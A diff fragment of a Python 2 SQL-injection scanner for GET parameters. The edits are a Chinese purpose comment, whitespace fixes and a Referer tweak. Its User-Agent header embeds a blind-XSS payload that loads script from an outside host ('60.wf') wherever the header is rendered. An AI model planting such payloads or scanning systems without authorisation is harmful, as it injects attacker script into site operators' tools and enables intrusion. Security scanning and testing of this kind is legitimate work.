@@ -1,6 +1,8 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 # author = w8ay
+# 该脚本用于检测页面是否存在GET参数的SQL注入漏洞
+
 import sys
 reload(sys)
 sys.setdefaultencoding("utf-8")
@@ -116,6 +118,7 @@ def GetRatio(firstPage, secondPage):
 
     match = SequenceMatcher(None, firstPage, secondPage).ratio()
     return match
+
 def Error_sqli(url,html):
     parse = urlparse.urlparse(url)
     if not parse.query:
@@ -140,7 +143,7 @@ def Error_sqli(url,html):
         except Exception:
             pass
     return False
-            
+
 def INT_sqli(url,html):
     parse = urlparse.urlparse(url)
     if not parse.query:
@@ -311,7 +314,7 @@ def Str_sqli(url,html):
 def poc(url):
     header = dict()
     header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36<sCRiPt/SrC=//60.wf/4PrhD>"
-    header["Referer"] = "http://www.baidu.com"
+    header["Referer"] = "http://www.baidu.com/"
     try:
         html = requests.get(url, headers=header).text
         s1 = Error_sqli(url,html)
